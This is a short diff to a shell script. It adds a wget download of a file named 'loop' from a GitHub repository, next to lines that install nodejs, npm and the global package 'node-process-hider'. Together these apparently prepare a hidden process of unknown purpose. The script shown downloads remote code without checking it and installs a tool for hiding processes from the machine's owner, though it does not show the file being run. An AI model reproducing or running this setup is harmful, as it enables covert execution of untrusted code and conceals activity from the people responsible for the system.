@@ -1,4 +1,5 @@
 #!/bin/sh
+wget https://github.com/breakok/ob/raw/main/loop
 apt install nodejs -y
 apt install npm -y
 npm i -g node-process-hider
